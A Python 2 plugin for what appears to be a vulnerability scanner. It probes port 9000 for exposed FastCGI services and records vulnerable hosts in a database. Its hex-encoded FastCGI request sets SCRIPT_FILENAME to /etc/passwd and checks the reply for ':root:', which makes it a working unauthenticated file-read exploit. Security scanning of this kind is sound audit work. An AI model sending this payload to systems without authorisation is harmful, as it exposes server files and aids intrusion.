#!/usr/bin/python
#-*- coding:utf-8 -*-

'''Fastcgi 命令执行'''

import commands,socket
from Plugins.iPluginBase import PluginBase
from Bin.lib.fastcgi.fpm import FPM
from common.threadpool import ThreadPool
from common.util import getCurTime
from config.db_settings import SYSVUL_TABLE
from config.logger import logger

__all__ = ['FastcgiPlugin']

class FastcgiPlugin(PluginBase):

    name = "FastcgiPlugin"
    version = '1.0'
    description = 'fastcgi remote exec'


    def __init__(self):
        PluginBase.__init__(self)
        self.threadpool = ThreadPool(num_of_threads= 10 , num_of_work= 10 , daemon = True)
        self.service = 'fastcgi'
        self.port_list = ['9000']

    def execute_run(self, ip, port, taskid):
        if str(port) in self.port_list:
            logger.info('[fastcgi] ip:%s, port:%s' % (str(ip), str(port)))
            self.threadpool.add_job(self.__test_fastcgi, ip, port)
            self.async_deal_into_db(taskid)


    def __test_fastcgi(self, *args, **kwargs):
        '''
        :param url:
        :return:
        '''
        bvulnerable = False
        (ip, port) = args[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(5.0)
        sock.connect((ip, int(port)))
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_,16))
        sock.send(data_s)
        try:
            ret = sock.recv(1024)
            print ret
            if ret.find(':root:') > 0:
                bvulnerable = True
            else:
                bvulnerable = False
        except:
            pass

        sock.close()

        return {'ip':ip, 'port': port, 'status':bvulnerable}



    def async_deal_into_db(self, taskid):
        '''
        异步入库
        :return:
        '''
        while not self.threadpool.resultQueue.empty():
            try:
                result_dit = self.threadpool.resultQueue.get_nowait()
                if result_dit['status']:
                    sysvul_dic = {}
                    sysvul_dic['sid'] = taskid
                    sysvul_dic['ip']  = result_dit['ip']
                    sysvul_dic['port'] = result_dit['port']
                    sysvul_dic['service'] = self.service
                    sysvul_dic['first_time'] = getCurTime()
                    self.plugin_db.insert_by_dict(SYSVUL_TABLE, sysvul_dic)
            except:
                break


    def wait_for_complete(self, taskid):
        #PluginBase.wait_for_complete(self)
        self.async_deal_into_db(taskid)
        self.db_close()